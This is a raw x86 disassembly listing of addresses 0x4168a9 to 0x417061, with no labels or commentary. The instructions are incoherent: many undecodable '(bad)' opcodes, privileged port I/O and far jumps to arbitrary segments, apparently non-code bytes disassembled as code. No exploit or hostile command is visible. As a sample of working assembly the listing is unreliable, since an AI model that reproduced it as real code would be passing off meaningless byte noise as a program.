  4168a9:	mov    ecx,0xcaec51c5
  4168ae:	inc    ebp
  4168af:	xor    BYTE PTR [edi],al
  4168b1:	pop    eax
  4168b2:	sub    dl,0xe0
  4168b5:	push   esp
  4168b6:	cmp    bl,ch
  4168b8:	(bad)  
  4168b9:	scas   al,BYTE PTR es:[edi]
  4168ba:	inc    eax
  4168bb:	fsubr  DWORD PTR [edi]
  4168bd:	int3   
  4168be:	pop    eax
  4168bf:	push   ebx
  4168c0:	std    
  4168c1:	cmp    al,0xc9
  4168c3:	mov    eax,0x3691a9b7
  4168c8:	push   esp
  4168c9:	daa    
  4168ca:	sub    al,0x3d
  4168cc:	ja     0x416853
  4168ce:	inc    edx
  4168cf:	sub    eax,0xfc573cb5
  4168d4:	fwait
  4168d5:	into   
  4168d6:	jp     0x4168df
  4168d8:	inc    eax
  4168d9:	pop    ds
  4168da:	push   ebx
  4168db:	adc    eax,0x1d9f5c36
  4168e0:	jg     0x4168ae
  4168e2:	lds    edi,FWORD PTR fs:[esp+esi*1+0x60]
  4168e7:	sbb    eax,0xd74aa93c
  4168ec:	push   ebx
  4168ed:	xchg   edx,eax
  4168ee:	inc    edx
  4168ef:	jo     0x416880
  4168f1:	xchg   ebp,eax
  4168f2:	test   BYTE PTR [edx+0x178f196a],0x1f
  4168f9:	mov    ebx,0x8ae76ec9
  4168fe:	lea    ebp,[ecx-0x3ab13804]
  416904:	mov    ah,0xed
  416906:	pushf  
  416907:	dec    edx
  416908:	or     cl,dh
  41690a:	xchg   cl,bl
  41690c:	mov    dh,0x39
  41690e:	std    
  41690f:	mov    eax,0x9a24fa2e
  416914:	pop    eax
  416915:	fisub  WORD PTR [ebx-0x65]
  416918:	pop    edx
  416919:	mov    al,0x35
  41691b:	add    eax,0x396a2d4
  416920:	bnd jno 0x416969
  416923:	push   ds
  416924:	sahf   
  416925:	mov    WORD PTR ds:0x10e14d0a,es
  41692b:	fmulp  st(0),st
  41692d:	clc    
  41692e:	ror    BYTE PTR [ebx+edx*2+0x7d],0xb1
  416933:	stos   BYTE PTR es:[edi],al
  416934:	sbb    al,0xcd
  416937:	and    esi,DWORD PTR [esi+0x58]
  41693a:	mov    esi,DWORD PTR [ecx-0x32]
  41693d:	bound  edi,QWORD PTR [edx]
  41693f:	std    
  416940:	mov    ch,0xdd
  416942:	fimul  DWORD PTR [esi+0x45]
  416945:	jae    0x41697d
  416947:	jns    0x4168e2
  416949:	pop    ss
  41694a:	and    eax,0x4e07fca7
  41694f:	pushf  
  416950:	add    ecx,esi
  416952:	je     0x4168d9
  416954:	iret   
  416955:	or     BYTE PTR [esi+edi*1+0x31d5e283],bl
  41695c:	dec    edx
  41695d:	dec    ebx
  41695e:	imul   ebx,DWORD PTR [ecx+0x71],0x3e
  416962:	inc    esi
  416963:	dec    esi
  416964:	mov    ds:0xdb8ee0c9,al
  416969:	push   ss
  41696a:	clc    
  41696b:	loopne 0x41695d
  41696d:	push   ebx
  41696e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41696f:	or     eax,0xd7b7a76f
  416974:	pop    ds
  416975:	xchg   esp,eax
  416976:	adc    al,0x37
  416978:	push   edi
  416979:	pop    edx
  41697a:	sub    DWORD PTR [eax-0x23],ebp
  41697d:	mov    eax,ds:0x70be629d
  416982:	mov    al,0xa7
  416984:	retf   0xf401
  416987:	push   es
  416988:	fmul   QWORD PTR [ecx-0x2f]
  41698b:	scas   eax,DWORD PTR es:[edi]
  41698c:	test   DWORD PTR [edi+0x6b6ab7c4],0x34a5e996
  416996:	jo     0x416a11
  416998:	sahf   
  416999:	or     eax,0x3fb7396a
  41699e:	inc    edx
  41699f:	mov    WORD PTR [ebp+0x7cc9d684],ds
  4169a5:	mov    cl,0xfc
  4169a7:	add    DWORD PTR [edi],esp
  4169a9:	aad    0xaf
  4169ab:	adc    DWORD PTR [eax-0x34fbda96],esi
  4169b1:	sbb    esi,DWORD PTR [edi+ebx*1]
  4169b4:	dec    esi
  4169b5:	ret    
  4169b6:	nop
  4169b7:	jmp    0x416a1d
  4169b9:	dec    eax
  4169ba:	(bad)  [edx-0x18c73b48]
  4169c0:	push   esp
  4169c1:	sti    
  4169c2:	call   edi
  4169c4:	adc    dh,BYTE PTR [edx]
  4169c6:	jge    0x4169ed
  4169c8:	js     0x416a05
  4169ca:	sbb    dl,bl
  4169cc:	out    0xe5,eax
  4169ce:	cld    
  4169cf:	dec    eax
  4169d0:	adc    eax,0x124c3483
  4169d5:	and    dl,BYTE PTR [ebp+0x21]
  4169d8:	dec    ebx
  4169d9:	mov    al,ds:0x2aea8376
  4169de:	imul   ecx,DWORD PTR ds:0x90976f04,0xfffffffb
  4169e5:	xor    DWORD PTR ds:0xe2b4f1d0,eax
  4169eb:	ficomp WORD PTR [eax+0x7cdb877c]
  4169f1:	ja     0x416a71
  4169f3:	push   ecx
  4169f4:	(bad)  
  4169f5:	adc    BYTE PTR [edi+0x31bbb862],dl
  4169fb:	sub    eax,DWORD PTR [edx-0x281bd34b]
  416a01:	jno    0x416a60
  416a03:	pop    ecx
  416a04:	jno    0x416a49
  416a06:	add    ah,ch
  416a08:	lea    ebp,ds:0x2f27bac3
  416a0e:	aaa    
  416a0f:	push   es
  416a10:	sbb    al,0x3e
  416a12:	mov    ?,WORD PTR [esi]
  416a14:	test   al,0xfa
  416a16:	test   eax,0x55a9863c
  416a1b:	cld    
  416a1c:	xor    bh,BYTE PTR [ebx+0x40]
  416a1f:	sub    DWORD PTR [esi-0x42d772cd],ebp
  416a25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a26:	(bad)
  416a29:	leave  
  416a2a:	xor    al,0xf2
  416a2c:	mov    gs,WORD PTR [ecx-0x15dcea28]
  416a32:	sbb    eax,0xcee70506
  416a37:	cwde   
  416a38:	or     esp,ebx
  416a3a:	ins    BYTE PTR es:[edi],dx
  416a3b:	mov    al,ds:0xd1cd718f
  416a40:	jmp    0xa825c540
  416a45:	retf   
  416a46:	cmp    bh,BYTE PTR [edx-0x694f0bc1]
  416a4c:	outs   dx,BYTE PTR ds:[esi]
  416a4d:	test   edi,ecx
  416a4f:	dec    edx
  416a50:	data16 mov dl,0x1f
  416a53:	es jmp 0x453e:0xbe63e724
  416a5b:	mov    ah,BYTE PTR [esi]
  416a5d:	loop   0x416a67
  416a5f:	pop    edx
  416a60:	jne    0x416a91
  416a62:	jb     0x416a19
  416a64:	retf   0x9fa9
  416a67:	xlat   BYTE PTR ds:[ebx]
  416a68:	xchg   edi,eax
  416a69:	adc    BYTE PTR [ebx+ebp*8-0x5d],0xe8
  416a6e:	outs   dx,DWORD PTR ds:[esi]
  416a6f:	mov    ah,0xac
  416a71:	mov    cl,0xd9
  416a73:	in     al,dx
  416a74:	shl    BYTE PTR [edx+0x4b7b75cc],0x40
  416a7b:	and    al,0xe5
  416a7d:	imul   edi,DWORD PTR [ebp-0x24],0xc544a3b5
  416a84:	dec    edx
  416a85:	pop    ds
  416a86:	fwait
  416a87:	out    dx,al
  416a88:	adc    eax,0x6b759a84
  416a8d:	popf   
  416a8e:	in     al,0x8c
  416a90:	adc    BYTE PTR [eax-0x10],ch
  416a93:	pop    ds
  416a94:	mov    bh,0xd
  416a96:	in     al,dx
  416a97:	hlt    
  416a98:	jle    0x416a54
  416a9a:	mov    ebp,0x6ca2edc8
  416a9f:	cmp    DWORD PTR [ecx+0x32],ecx
  416aa2:	aad    0xfd
  416aa4:	pop    esi
  416aa5:	dec    edx
  416aa6:	aad    0xdc
  416aa8:	xor    al,BYTE PTR [ebx+0x205c23f4]
  416aae:	scas   al,BYTE PTR es:[edi]
  416aaf:	pop    esi
  416ab0:	popf   
  416ab1:	inc    ecx
  416ab2:	fs jmp 0x416b08
  416ab5:	test   BYTE PTR [edi-0x120520cf],al
  416abb:	or     eax,DWORD PTR [ebx-0x7abdeadf]
  416ac1:	mov    eax,ds:0x77d667f
  416ac6:	cmp    edi,ebp
  416ac8:	inc    eax
  416ac9:	outs   dx,DWORD PTR ds:[esi]
  416aca:	mov    esp,0x5d0a99ad
  416acf:	dec    ebp
  416ad0:	mov    esi,0x812e0202
  416ad5:	xchg   edi,eax
  416ad6:	(bad)
  416ad9:	and    eax,0xdcb6092c
  416ade:	loope  0x416b5a
  416ae0:	cmp    BYTE PTR [ebx],dl
  416ae2:	xor    edx,esp
  416ae4:	aad    0x84
  416ae6:	add    eax,0x7a102a5d
  416aeb:	js     0x416aa5
  416aed:	clc    
  416aee:	pushf  
  416aef:	pop    esi
  416af0:	xchg   esp,eax
  416af1:	out    0x23,eax
  416af3:	hlt    
  416af4:	retf   
  416af5:	bnd jg 0x416a7e
  416af8:	cmp    cl,al
  416afa:	cmp    BYTE PTR [ebx+eax*1+0x3fc7a955],dl
  416b01:	out    0x7,eax
  416b03:	mov    al,0xf3
  416b05:	mov    al,ds:0x7e2f429
  416b0a:	lea    esp,[edi-0x52]
  416b0d:	(bad)  
  416b0e:	in     eax,dx
  416b0f:	pop    eax
  416b10:	data16 loopne 0x416b4a
  416b13:	inc    esp
  416b14:	imul   ebp,DWORD PTR [edx+0x41d2f507],0xf8b1e757
  416b1e:	adc    al,BYTE PTR [esp+eiz*8+0x59]
  416b22:	stos   DWORD PTR es:[edi],eax
  416b23:	das    
  416b24:	mov    ah,BYTE PTR [ecx]
  416b26:	inc    ecx
  416b27:	push   0xfffffff4
  416b29:	das    
  416b2a:	xchg   ebp,eax
  416b2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b2c:	loop   0x416b26
  416b2e:	imul   esp,DWORD PTR [esi],0x68
  416b31:	adc    eax,0x6d0bf833
  416b36:	or     DWORD PTR [ecx+0x3],ecx
  416b39:	popf   
  416b3a:	mov    bl,BYTE PTR [edx+0x6c]
  416b3d:	aaa    
  416b3e:	fcomi  st,st(0)
  416b40:	inc    esi
  416b41:	fld    TBYTE PTR ds:0x240ec445
  416b47:	mov    cl,0xc6
  416b49:	lahf   
  416b4a:	shr    BYTE PTR [edi-0xfd9cecb],cl
  416b50:	test   DWORD PTR [edi+edx*8+0x24a004f6],ebp
  416b57:	pop    es
  416b58:	repz aas 
  416b5a:	sub    DWORD PTR [edx+0x21e57d66],ebp
  416b60:	inc    ebp
  416b61:	pop    edi
  416b62:	sub    eax,0x989fcda
  416b67:	inc    DWORD PTR [esi]
  416b69:	or     al,0xda
  416b6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b6c:	cmp    bl,al
  416b6e:	push   esi
  416b6f:	mov    al,0x8
  416b71:	inc    edx
  416b72:	jl     0x416bda
  416b74:	cld    
  416b75:	dec    ebx
  416b76:	hlt    
  416b77:	xchg   ebx,eax
  416b78:	bound  ebx,QWORD PTR [esp+edi*1+0x460adfcf]
  416b7f:	mov    bl,0x14
  416b81:	mov    ds:0x58c2efc8,al
  416b86:	or     cl,BYTE PTR [edx-0x8fe8ad6]
  416b8c:	std    
  416b8d:	push   cs
  416b8e:	enter  0x8d78,0x8
  416b92:	enter  0x4132,0x48
  416b96:	hlt    
  416b97:	ret    0x35b5
  416b9a:	sub    eax,0x410cb5a5
  416b9f:	push   ecx
  416ba0:	ret    
  416ba1:	jne    0x416ba9
  416ba3:	adc    al,0xed
  416ba5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ba6:	mov    ebx,0x9760ce96
  416bab:	std    
  416bac:	xor    DWORD PTR [ebp+0x3be96bb0],ebx
  416bb2:	loopne 0x416ba7
  416bb4:	pop    esp
  416bb5:	aam    0x85
  416bb7:	fstp   DWORD PTR [ecx+0x4c]
  416bba:	addr16 adc al,0x60
  416bbd:	bswap  edx
  416bbf:	push   esp
  416bc0:	pop    edx
  416bc1:	test   DWORD PTR [edi-0x373ec5bc],ebp
  416bc7:	pop    eax
  416bc8:	dec    edx
  416bc9:	cwde   
  416bca:	pop    ecx
  416bcb:	jge    0x416b89
  416bcd:	cmp    BYTE PTR [esi+0x6d],0xf7
  416bd1:	neg    ebx
  416bd3:	mov    esi,0x2490943f
  416bd8:	jp     0x416b5b
  416bda:	fstp   QWORD PTR [ecx+0x40]
  416bdd:	mov    edx,DWORD PTR [esi+edx*2+0x54]
  416be1:	or     eax,0x9ba5f21e
  416be6:	cmp    eax,0x5ac0390a
  416beb:	cmp    ecx,DWORD PTR [edi]
  416bed:	mov    esi,0x7d5f3ca9
  416bf2:	inc    edi
  416bf3:	dec    ebp
  416bf4:	gs clc 
  416bf6:	clc    
  416bf7:	push   esi
  416bf8:	jp     0x416bd8
  416bfa:	xchg   BYTE PTR [ebp-0x23a15a63],bl
  416c00:	or     eax,0x9be86ac5
  416c05:	and    ecx,ebx
  416c07:	setbe  BYTE PTR [edi-0x4a1b4a01]
  416c0e:	sbb    dl,al
  416c10:	sbb    ch,al
  416c12:	pop    esp
  416c13:	in     eax,0x67
  416c15:	mov    al,ds:0x91cf5fcf
  416c1a:	ins    DWORD PTR es:[edi],dx
  416c1b:	(bad)  
  416c1c:	aad    0x3d
  416c1e:	cs ja  0x416c30
  416c21:	mov    esi,0x30d27eb8
  416c26:	pusha  
  416c27:	shl    BYTE PTR [esi-0x2a],cl
  416c2a:	pop    eax
  416c2b:	or     esp,DWORD PTR [ecx+0xa]
  416c2e:	inc    esi
  416c2f:	mov    ebx,0x35cb6929
  416c34:	jae    0x416c40
  416c36:	jns    0x416bc5
  416c38:	jp     0x416c22
  416c3a:	pop    edx
  416c3b:	fdivr  DWORD PTR [ebx+0xfd9c77e]
  416c41:	jg     0x416c36
  416c43:	jmp    0x8c988c2b
  416c48:	outs   dx,DWORD PTR ds:[esi]
  416c49:	lock dec ecx
  416c4b:	add    BYTE PTR [ecx-0x2e216a63],dh
  416c51:	shr    BYTE PTR [edi],0x97
  416c54:	xchg   ebp,eax
  416c55:	dec    edi
  416c56:	std    
  416c57:	mov    eax,0x151be44a
  416c5c:	lea    ecx,[esi]
  416c5e:	icebp  
  416c5f:	mov    cl,0x1f
  416c61:	imul   ebp,esi,0xc
  416c64:	dec    eax
  416c65:	adc    ch,dh
  416c67:	cld    
  416c68:	jg     0x416c7c
  416c6a:	inc    eax
  416c6b:	out    0x19,eax
  416c6d:	add    esi,DWORD PTR [edx]
  416c6f:	ja     0x416bf3
  416c71:	test   BYTE PTR [edi],al
  416c73:	popf   
  416c74:	into   
  416c75:	jmp    DWORD PTR [edi+0x2265be62]
  416c7b:	inc    edx
  416c7c:	aas    
  416c7d:	sub    DWORD PTR [edi+ebx*4-0x2e5faa2c],0x2c
  416c85:	test   eax,0x522dc4d5
  416c8a:	into   
  416c8b:	xchg   BYTE PTR [ebp-0x53cfa4ac],dl
  416c91:	inc    ecx
  416c92:	scas   eax,DWORD PTR es:[edi]
  416c93:	stos   DWORD PTR es:[edi],eax
  416c94:	xor    DWORD PTR [eax],0x8a87f2ca
  416c9a:	pop    esp
  416c9b:	call   0x58cf:0xeb9612ae
  416ca2:	mov    dh,0x1a
  416ca4:	inc    ebp
  416ca5:	sar    DWORD PTR [ecx-0x3b],0x37
  416ca9:	stos   BYTE PTR es:[edi],al
  416caa:	pop    eax
  416cab:	cmp    al,0x84
  416cad:	(bad)  
  416cae:	pop    ebx
  416caf:	(bad)  
  416cb0:	push   edi
  416cb1:	ret    0xe2f1
  416cb4:	xchg   edi,eax
  416cb5:	mov    bp,0xaa90
  416cb9:	stos   DWORD PTR es:[edi],eax
  416cba:	or     eax,0xc5bcd066
  416cbf:	add    dh,cl
  416cc1:	jecxz  0x416c90
  416cc3:	call   0x59f0:0x6cc27f69
  416cca:	popf   
  416ccb:	cli    
  416ccc:	jae    0x416c93
  416cce:	adc    ebp,esp
  416cd0:	mov    ch,0x43
  416cd2:	mov    eax,ds:0x3dee3594
  416cd7:	xor    esp,DWORD PTR [edx+edi*2]
  416cda:	data16 stc 
  416cdc:	or     DWORD PTR [esi+0x2b],esp
  416cdf:	cmp    dl,BYTE PTR [eax-0x1ba59f43]
  416ce5:	js     0x416d44
  416ce7:	je     0x416d0b
  416ce9:	push   0x1
  416ceb:	dec    ebp
  416cec:	inc    edi
  416ced:	jmp    0x416ccf
  416cef:	hlt    
  416cf0:	inc    ecx
  416cf1:	in     al,dx
  416cf2:	shl    cl,cl
  416cf4:	ret    
  416cf5:	loope  0x416d23
  416cf7:	ficom  WORD PTR [ebx]
  416cf9:	loop   0x416c84
  416cfb:	cwde   
  416cfc:	dec    esi
  416cfd:	xlat   BYTE PTR ds:[ebx]
  416cfe:	lea    edx,[ecx]
  416d00:	adc    al,0xcc
  416d02:	lods   al,BYTE PTR ds:[esi]
  416d03:	lahf   
  416d04:	or     al,0xd2
  416d06:	jp     0x416ca0
  416d08:	stos   DWORD PTR es:[edi],eax
  416d09:	imul   ecx,DWORD PTR [ebx+0x29c9928a],0x67393302
  416d13:	mov    cl,0xac
  416d15:	lea    ebp,[edx-0x48]
  416d18:	mov    BYTE PTR ds:0x6b683126,ch
  416d1e:	ins    DWORD PTR es:[edi],dx
  416d1f:	dec    esp
  416d20:	sub    eax,edi
  416d22:	icebp  
  416d23:	lds    edi,FWORD PTR [edi-0x70]
  416d26:	dec    ebx
  416d27:	stc    
  416d28:	bound  esp,QWORD PTR [esi]
  416d2a:	mov    cl,0xb9
  416d2c:	js     0x416da0
  416d2e:	push   edi
  416d2f:	push   ebp
  416d30:	xor    ecx,DWORD PTR [ebx+0x675da5e2]
  416d36:	data16 cld 
  416d38:	adc    BYTE PTR cs:[ebp-0x66],ch
  416d3c:	inc    esp
  416d3d:	add    eax,0x37f148c0
  416d42:	in     eax,0x27
  416d44:	imul   BYTE PTR [edx]
  416d46:	mov    bh,BYTE PTR [ecx-0x6e69e5f1]
  416d4c:	popf   
  416d4d:	pop    ss
  416d4e:	add    DWORD PTR [edi+0x74b9e84e],0x1f
  416d55:	push   0x44
  416d57:	in     al,0xa2
  416d59:	inc    esp
  416d5a:	or     bh,cl
  416d5c:	mov    bh,0xd
  416d5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d5f:	icebp  
  416d60:	cmc    
  416d61:	aad    0xc3
  416d63:	xchg   edi,eax
  416d64:	push   ebx
  416d65:	inc    edx
  416d66:	fist   WORD PTR [ecx+0x39]
  416d69:	lods   al,BYTE PTR ds:[esi]
  416d6a:	xor    ch,bh
  416d6c:	mov    ds:0x5e7f8dd8,eax
  416d71:	repnz cmc 
  416d73:	jg     0x416de4
  416d75:	stc    
  416d76:	test   eax,0x8634d74b
  416d7b:	mov    bl,0xbe
  416d7d:	dec    esi
  416d7e:	ins    BYTE PTR es:[edi],dx
  416d7f:	(bad)  
  416d80:	iret   
  416d81:	sub    DWORD PTR [ecx],0xaa8074c6
  416d87:	pop    edx
  416d88:	add    al,0xb1
  416d8a:	fstp   TBYTE PTR [edx+esi*2-0x21]
  416d8e:	cmp    DWORD PTR [ebx+edi*4-0x693daec8],edi
  416d95:	push   eax
  416d96:	mov    al,0x39
  416d98:	push   edx
  416d99:	bound  esp,QWORD PTR [eax]
  416d9b:	jb     0x416da4
  416d9d:	mov    ds:0x2d4d33e7,eax
  416da2:	pop    edi
  416da3:	in     eax,dx
  416da4:	pop    esp
  416da5:	dec    ebx
  416da6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416da7:	jge    0x416de2
  416da9:	test   esi,edi
  416dab:	aaa    
  416dac:	shl    DWORD PTR [edi+0x1a8124c5],0xb3
  416db3:	add    bh,BYTE PTR [esi-0x6b7eb0f0]
  416db9:	cwde   
  416dba:	ror    DWORD PTR [ebx-0x6e1caf0d],0x81
  416dc1:	outs   dx,BYTE PTR ds:[esi]
  416dc2:	mov    edx,0x7425e02b
  416dc7:	fwait
  416dc8:	push   ebx
  416dc9:	mov    ecx,0xe0a03daa
  416dce:	(bad)  [ecx]
  416dd0:	dec    ebx
  416dd1:	jecxz  0x416d84
  416dd3:	adc    edi,DWORD PTR [esi+0x65]
  416dd6:	arpl   WORD PTR [ebx-0x6a],cx
  416dd9:	hlt    
  416dda:	adc    bh,BYTE PTR [eax]
  416ddc:	lods   al,BYTE PTR ds:[esi]
  416ddd:	dec    edi
  416dde:	lods   eax,DWORD PTR ds:[esi]
  416ddf:	push   edx
  416de0:	xor    esp,DWORD PTR [edx]
  416de2:	mov    dh,0xa7
  416de4:	mov    esi,0xb13de823
  416de9:	dec    ebp
  416dea:	call   0x48c5:0x286a2d2d
  416df1:	ja     0x416d88
  416df3:	loope  0x416dea
  416df5:	push   ecx
  416df6:	xor    cl,BYTE PTR [eax]
  416df8:	das    
  416df9:	add    dh,BYTE PTR [edi+esi*8-0x73f549a3]
  416e00:	fld    TBYTE PTR [eax-0x76]
  416e03:	aaa    
  416e04:	and    DWORD PTR [eax+ebx*1-0x691bb3f],esp
  416e0b:	fisttp QWORD PTR [eax+0x15]
  416e0e:	mov    al,0x7b
  416e10:	or     dh,BYTE PTR [esi-0x7c5ed0b]
  416e16:	cmp    DWORD PTR [edx],ebx
  416e18:	jl     0x416e60
  416e1a:	inc    esp
  416e1b:	mov    dh,0x1f
  416e1d:	stos   DWORD PTR es:[edi],eax
  416e1e:	inc    esp
  416e1f:	rcr    DWORD PTR [eax+0x33182371],0xa0
  416e26:	popf   
  416e27:	adc    al,0x55
  416e29:	push   esi
  416e2a:	mov    esp,DWORD PTR [esi-0x46]
  416e2d:	mov    cl,0x11
  416e2f:	leave  
  416e30:	or     eax,DWORD PTR [esi+0x37e86bc1]
  416e36:	and    ah,BYTE PTR [ecx+0x9]
  416e39:	jecxz  0x416e71
  416e3b:	mov    ecx,0x363ee7b6
  416e40:	inc    ebx
  416e41:	jl     0x416e73
  416e43:	shl    BYTE PTR [edx],0xcf
  416e46:	and    DWORD PTR [ecx],edi
  416e48:	dec    ebx
  416e49:	fucomip st,st(1)
  416e4b:	mov    ecx,0x625c95b3
  416e50:	adc    al,0x85
  416e52:	fs test al,0x22
  416e55:	pop    ebx
  416e56:	into   
  416e57:	push   esi
  416e58:	pusha  
  416e59:	xlat   BYTE PTR ds:[ebx]
  416e5a:	pop    ds
  416e5b:	jb     0x416e7f
  416e5d:	ret    
  416e5e:	stc    
  416e5f:	retf   0xc48d
  416e62:	add    esi,DWORD PTR gs:[ebp-0x285bd491]
  416e69:	push   esi
  416e6a:	clc    
  416e6b:	loop   0x416e14
  416e6d:	mov    ds:0xc60e5276,eax
  416e72:	xchg   edi,eax
  416e73:	cwde   
  416e74:	xchg   edi,eax
  416e75:	sti    
  416e76:	push   ss
  416e77:	mov    dl,0xd0
  416e79:	enter  0x7821,0x68
  416e7d:	and    edx,DWORD PTR [ebx+0x3c]
  416e80:	fisttp DWORD PTR [eax]
  416e82:	sahf   
  416e83:	mov    cl,0xf
  416e85:	jns    0x416e9a
  416e87:	out    0x61,al
  416e89:	mov    bh,0x6a
  416e8b:	fiadd  DWORD PTR [ebx]
  416e8d:	jae    0x416ed2
  416e8f:	pop    ds
  416e90:	lds    esp,FWORD PTR [edi-0x6ae28fb7]
  416e96:	bound  ebp,QWORD PTR [edi-0x62]
  416e99:	push   es
  416e9a:	xchg   edx,eax
  416e9b:	jge    0x416e86
  416e9d:	in     al,dx
  416e9e:	fdiv   st,st(5)
  416ea0:	push   ds
  416ea1:	cwde   
  416ea2:	or     edx,DWORD PTR [ebx+0x5443ca23]
  416ea8:	xor    al,BYTE PTR [edx-0x5c]
  416eab:	mov    dl,0x6d
  416ead:	sub    al,0x45
  416eaf:	outs   dx,DWORD PTR ds:[esi]
  416eb0:	popa   
  416eb1:	scas   al,BYTE PTR es:[edi]
  416eb2:	inc    esp
  416eb3:	neg    DWORD PTR [ebp-0x37]
  416eb6:	mov    DWORD PTR [ebx],edi
  416eb8:	xchg   ebx,eax
  416eb9:	mov    al,0xb9
  416ebb:	dec    esi
  416ebc:	jns    0x416e98
  416ebe:	fdivr  QWORD PTR [edx-0x72]
  416ec1:	popa   
  416ec2:	icebp  
  416ec3:	mov    ebx,0x342ee149
  416ec8:	mov    BYTE PTR ds:[ebx],0x8d
  416ecc:	pop    ebx
  416ecd:	mov    ebx,0xf546559c
  416ed2:	jmp    0x416e90
  416ed4:	int    0x89
  416ed6:	fsub   QWORD PTR [edi]
  416ed8:	push   0x4a28ae9e
  416edd:	pushf  
  416ede:	(bad)  
  416edf:	dec    edi
  416ee0:	or     ebx,DWORD PTR [ebp+esi*4-0x74]
  416ee4:	(bad)  
  416ee5:	mov    edi,0xbf1be048
  416eea:	es js  0x416f41
  416eed:	pop    ecx
  416eee:	mov    bh,0x2a
  416ef0:	or     al,0xb3
  416ef2:	sar    DWORD PTR [ebp-0x4b16ec0c],cl
  416ef8:	mov    ss,WORD PTR [ecx+esi*2-0x7c]
  416efc:	cwde   
  416efd:	mov    dl,BYTE PTR [edx+0x8b50898]
  416f03:	out    dx,al
  416f04:	push   ss
  416f05:	push   es
  416f06:	popa   
  416f07:	test   DWORD PTR ss:[ebx],ebx
  416f0a:	(bad)  
  416f0b:	test   eax,0x852b35fc
  416f10:	adc    DWORD PTR [eax+0x2ea2fa12],ebx
  416f16:	sar    BYTE PTR [esi],1
  416f18:	and    ebp,DWORD PTR [esi+0x193844be]
  416f1e:	out    0xf1,al
  416f20:	enter  0x36b2,0x90
  416f24:	add    eax,0x7248b924
  416f29:	dec    ebp
  416f2a:	aam    0x5b
  416f2c:	popa   
  416f2d:	les    ebx,FWORD PTR [esi+0x17]
  416f30:	pop    ebp
  416f31:	jno    0x783d58f7
  416f37:	(bad)  
  416f38:	loopne 0x416f48
  416f3a:	fwait
  416f3b:	pop    edx
  416f3c:	cmp    al,0xd0
  416f3e:	adc    BYTE PTR [edx],dl
  416f40:	dec    ebp
  416f41:	(bad)  
  416f44:	inc    edi
  416f45:	add    DWORD PTR [edx-0x60],esi
  416f48:	xchg   DWORD PTR [ecx],edi
  416f4a:	es inc edx
  416f4c:	mov    bh,BYTE PTR [ebx+0x5abdfd33]
  416f52:	xlat   BYTE PTR ds:[ebx]
  416f53:	mov    fs,WORD PTR [eax+eiz*4+0x48]
  416f57:	lea    ecx,[ebx+0x40]
  416f5a:	cmp    edi,esp
  416f5c:	jmp    0x5046:0xe2043cbc
  416f63:	mov    eax,0xe26449d1
  416f68:	lahf   
  416f69:	ins    BYTE PTR es:[edi],dx
  416f6a:	lahf   
  416f6b:	and    edi,edi
  416f6d:	jae    0x416f24
  416f6f:	fwait
  416f70:	push   ecx
  416f71:	or     al,0x9c
  416f73:	mov    ah,0xec
  416f75:	and    eax,0x3a3a67ab
  416f7a:	fucomip st,st(2)
  416f7c:	inc    esp
  416f7d:	xchg   edi,eax
  416f7e:	or     ah,dl
  416f80:	dec    ebp
  416f81:	sub    cl,al
  416f83:	sahf   
  416f84:	add    BYTE PTR [eax],al
  416f86:	fcmovnu st,st(4)
  416f88:	mov    ebx,0x6e36035c
  416f8d:	fisttp DWORD PTR [ecx-0x565fbfd0]
  416f93:	mov    WORD PTR [edx],fs
  416f95:	mov    BYTE PTR [edi+0x5eab6bd7],bh
  416f9b:	inc    ebp
  416f9c:	sub    DWORD PTR [edi+0x7be7d694],0xd9d5b1a2
  416fa6:	cmp    eax,0xd96a2b8a
  416fab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fac:	stos   DWORD PTR es:[edi],eax
  416fad:	stos   BYTE PTR es:[edi],al
  416fae:	jae    0x416fc4
  416fb0:	pop    ds
  416fb1:	in     eax,0xc2
  416fb3:	nop
  416fb4:	jmp    0x9374:0x539891c2
  416fbb:	test   eax,0xc0647d2b
  416fc0:	xor    DWORD PTR [esi],edi
  416fc2:	fsubr  DWORD PTR ds:0x36725cd1
  416fc8:	jbe    0x416f86
  416fca:	in     al,0x6c
  416fcc:	sub    ah,BYTE PTR [ebp-0x2a05605b]
  416fd2:	jecxz  0x417014
  416fd4:	pop    edi
  416fd5:	into   
  416fd6:	mov    ebp,0x78220d4d
  416fdb:	xchg   ecx,eax
  416fdc:	mov    ds:0x4f65e957,eax
  416fe1:	adc    ebp,DWORD PTR [ebx+0x40fe52b1]
  416fe7:	xor    DWORD PTR [edi],ecx
  416fe9:	shr    BYTE PTR [esi-0x4716bcf2],1
  416fef:	mov    cl,0xf3
  416ff1:	sub    ah,BYTE PTR [eax]
  416ff3:	inc    esi
  416ff4:	(bad)  
  416ff5:	(bad)  
  416ff7:	jg     0x416fbf
  416ff9:	in     al,dx
  416ffa:	push   0x45
  416ffc:	dec    ebp
  416ffd:	shl    DWORD PTR [eax+0x4a],cl
  417000:	into   
  417001:	repnz sub ebx,ecx
  417004:	(bad)  
  417005:	fild   WORD PTR [esi-0x5b4684ea]
  41700b:	sub    bl,ah
  41700d:	std    
  41700e:	out    0x7,al
  417010:	bound  eax,QWORD PTR [edi+0x7ad13a29]
  417016:	sub    ebx,edx
  417018:	xor    edx,DWORD PTR fs:[ecx+0x517e2cb1]
  41701f:	pop    edx
  417020:	push   esp
  417021:	push   0xfffffffe
  417023:	sbb    DWORD PTR [ecx+0x521a3028],0x3794ab4e
  41702d:	cli    
  41702e:	or     edx,ecx
  417030:	inc    eax
  417031:	fidiv  DWORD PTR [ecx]
  417033:	xchg   ebp,eax
  417034:	test   eax,0xc6132fd3
  417039:	push   0x7e451f22
  41703e:	mov    dh,0x5e
  417040:	inc    ebp
  417041:	fisttp WORD PTR es:[eax]
  417044:	lahf   
  417045:	loop   0x416fec
  417047:	retf   
  417048:	(bad)  
  417049:	mov    ch,0x45
  41704b:	aad    0xbe
  41704d:	jmp    0x6fce:0xbb647160
  417054:	cmp    bl,al
  417056:	push   ds
  417057:	mov    bh,0x60
  417059:	inc    esp
  41705b:	cmp    esp,DWORD PTR [eax]
  41705d:	into   
  41705e:	fnstenv [edi]
  417060:	inc    esi
  417061:	ins    BYTE PTR es:[edi],dx
